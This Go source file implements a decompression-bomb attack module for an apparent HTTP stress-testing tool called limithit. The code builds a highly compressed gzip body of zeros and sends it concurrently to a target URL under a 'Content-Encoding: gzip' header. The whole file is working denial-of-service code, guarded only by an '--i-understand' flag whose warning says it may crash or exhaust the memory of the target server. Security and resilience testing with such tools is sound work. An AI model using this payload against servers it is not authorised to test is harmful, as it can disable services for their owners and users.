package gzipbomb

import (
	"bytes"
	"compress/gzip"
	"context"
	"errors"
	"flag"
	"fmt"
	"net/http"

	"github.com/conantorreswf/limithit/internal/attacks"
	"github.com/conantorreswf/limithit/internal/worker"
)

func init() {
	attacks.Register("gzipbomb", func() attacks.Attack { return &GzipBomb{} })
}

type GzipBomb struct {
	expandedMB   int
	iUnderstand  bool
	method       string
	payload      []byte
}

func (g *GzipBomb) Name() string     { return "gzipbomb" }
func (g *GzipBomb) Synopsis() string { return "decompression amplification via Content-Encoding: gzip" }

func (g *GzipBomb) Flags(fs *flag.FlagSet) {
	fs.IntVar(&g.expandedMB, "expanded-mb", 10, "size of the expanded body in MB that the server must decompress")
	fs.StringVar(&g.method, "method", "POST", "HTTP method")
	fs.BoolVar(&g.iUnderstand, "i-understand", false, "required safety acknowledgement to run this attack")
}

func (g *GzipBomb) Validate() error {
	if !g.iUnderstand {
		return errors.New("gzipbomb requires --i-understand flag: this attack may crash or OOM a server that decompresses the body")
	}
	if g.expandedMB < 1 {
		return errors.New("expanded-mb must be >= 1")
	}
	return nil
}

func (g *GzipBomb) Run(ctx context.Context, base attacks.Base) (attacks.Report, error) {
	bomb, err := buildBomb(g.expandedMB)
	if err != nil {
		return nil, fmt.Errorf("gzipbomb: failed to build payload: %w", err)
	}
	g.payload = bomb

	method := g.method
	build := func(ctx context.Context, _ int) (*http.Request, string, error) {
		req, err := http.NewRequestWithContext(ctx, method, base.URL, bytes.NewReader(g.payload))
		if err != nil {
			return nil, "", err
		}
		req.Header.Set("Content-Encoding", "gzip")
		req.Header.Set("Content-Type", "application/octet-stream")
		req.ContentLength = int64(len(g.payload))
		for k, vs := range base.Common.Headers {
			for _, v := range vs {
				req.Header.Add(k, v)
			}
		}
		return req, "", nil
	}

	return worker.Run(ctx, base.Client, build, worker.Config{
		Total:       base.Common.Total,
		Concurrency: base.Common.Concurrency,
		Pacer:       base.Common.Pacer,
		Tag:         "gzipbomb",
	}), nil
}

// buildBomb produces a gzip-compressed body whose decompressed size is expandedMB megabytes.
func buildBomb(expandedMB int) ([]byte, error) {
	expanded := int64(expandedMB) << 20
	var buf bytes.Buffer
	w, err := gzip.NewWriterLevel(&buf, gzip.BestCompression)
	if err != nil {
		return nil, err
	}
	zeros := make([]byte, 32*1024)
	var written int64
	for written < expanded {
		n := int64(len(zeros))
		if written+n > expanded {
			n = expanded - written
		}
		if _, err := w.Write(zeros[:n]); err != nil {
			return nil, err
		}
		written += n
	}
	if err := w.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}
